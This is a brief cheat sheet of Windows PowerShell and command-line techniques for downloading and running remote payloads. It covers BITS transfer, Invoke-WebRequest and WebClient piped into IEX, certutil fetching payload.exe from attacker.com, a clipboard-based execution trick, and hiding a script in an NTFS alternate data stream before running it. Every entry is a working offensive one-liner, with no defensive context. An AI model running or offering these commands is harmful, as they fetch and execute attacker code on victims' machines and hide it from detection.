BITS Transfer:

```powershell
Start-BitsTransfer -Source http://192.168.1.2:8080/golang/hello.exe -Destination hello.exe
```

Invoke-WebRequest

```powershell
IWR -Uri http://192.168.1.2:8080/ps1/runcmd.ps1 -UseBasicParsing | IEX
```

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8080/ps1/runcmd.ps1')
```

```
certutil -urlcache -f http://attacker.com/payload.exe payload.exe
```

```
Add-Type -Assembly PresentationCore
[Windows.Clipboard]::SetText((irm http://192.168.1.2:8080/ps1/runcmd.ps1))
sleep 2
IEX ([Windows.Clipboard]::GetText())
```

```
# Ẩn payload trong ADS
(New-Object Net.WebClient).DownloadString('http://192.168.1.2:8080/ps1/runcmd.ps1') | Add-Content -Path .\file.txt -Stream hidden.ps1
gc file.txt -Stream hidden.ps1 | IEX
```
